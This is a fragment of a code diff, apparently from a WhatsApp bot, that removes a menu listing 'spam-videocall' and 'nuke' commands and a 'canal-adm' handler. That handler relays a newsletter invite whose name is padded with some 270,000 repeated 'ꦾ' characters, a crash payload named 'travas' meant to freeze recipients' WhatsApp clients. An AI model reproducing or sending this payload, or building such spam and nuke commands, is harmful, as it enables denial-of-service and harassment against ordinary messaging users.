-> spam-videocall +593xxx,<cantidad>    
-> good 593xxx  
-> andro-ios
-> canal-adm
-> convite
-> canal-ios
-  OTROS 
-> play <nombre>  
-> lin
-> tt link
-> nuke
-> tag`,
-        footer: `𝐏 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘`,
-        buttons: [
-            {
-                buttonId: '..',
-                buttonText: { displayText: '.' },
-                type: 4,
-                nativeFlowInfo: {
-                    name: 'single_select',
-                    paramsJson: JSON.stringify({
-                        title: "𝐵𝑂𝑇 𝑉𝐼𝑃",
-                        sections: [
-                            {
-                                title: "INFO",
-                                rows: [
-                                    {
-                                        title: " 《 • INFO • 》",
-                                        description: "𝐵𝑂𝑇 𝑉𝐼𝑃",
-                                        id: `info`
-                                    }
-                                ]
-                            }
-                        ]
-                    })
-                }
-            },
-        ],
-        headerType: 1,
-        viewOnce: true
-    }, { quoted: m });
-break;
-
-case "canal-adm":
-const travas = `${"ꦾ".repeat(90000)}`
-if (!isBot && !isCreator) return 
-if (m.isGroup && groupid.includes(m.chat)) {
-    return reply("❎❎❎❎");
-}
-conn.relayMessage(from,{"newsletterAdminInviteMessage":{"newsletterJid":"120363282786345717@newsletter","newsletterName":"🗣🗣🗣🗣" + travas + travas + travas ,"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADMARwMBIgACEQEDEQH/xAAoAAEBAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAAM4AAAgqCoAAAAAAAAAKBAAAA//EABQQAQAAAAAAAAAAAAAAAAAAAFD/2gAIAQIBAT8AF//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AF//Z","caption":"𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁","inviteExpiration":"1717872809"}},{})
-conn.relayMessage(from,{extendedTextMessage: {text: `𝐏.𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘  ᶻ 𝗓 𐰁`}},{})
-break
 
 default:
 }
